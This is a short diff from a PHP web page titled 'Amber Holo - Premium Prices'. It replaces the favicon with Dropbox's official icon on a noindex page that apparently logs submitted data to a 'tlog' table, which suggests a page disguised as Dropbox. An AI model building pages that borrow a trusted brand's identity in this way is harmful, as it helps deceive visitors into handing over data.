@@ -69,7 +69,7 @@ if (insertDataIntoDatabase("tlog", $keys, $values)) {
 
   <meta charset="UTF-8">
   <title>Amber Holo - Premium Prices </title>
-  <link rel="icon" href="https://s142.convertio.me/p/UuIh6a4dCbV1g38uSNBieg/8bfdf903ac8a554acffee08ea8fb748f/F8-F983-B5-4-EC5-4-D3-C-A86-E-285-EF3957391.ico" type="image/x-icon">
+  <link rel="icon" href="https://cfl.dropboxstatic.com/static/metaserver/static/images/favicon-vfl8lUR9B.ico" type="image/x-icon">
   <meta name="robots" content="noindex">
 
 
